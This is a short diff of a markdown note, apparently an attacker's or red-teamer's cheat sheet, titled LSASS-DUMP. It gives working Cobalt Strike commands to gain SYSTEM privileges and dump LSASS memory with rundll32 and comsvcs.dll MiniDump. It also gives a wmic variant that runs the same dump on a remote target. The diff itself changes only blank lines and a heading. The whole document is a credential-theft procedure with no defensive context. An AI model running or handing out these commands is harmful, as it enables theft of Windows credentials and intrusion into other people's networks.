@@ -1,7 +1,9 @@
 # LSASS-DUMP
-LSASS:
+
+
 method via cobalt: (*** special thanks to @dtob1804 )
 !* 1) getsystem
+
 2) shell rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump PID C:\ProgramData\lsass.dmp full (the pid is from lsass)
 (remove on remote car) coba_wmic:
 shell wmic /node:[target] process call create "cmd /c rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump PID C:\ProgramData\lsass.dmp full"
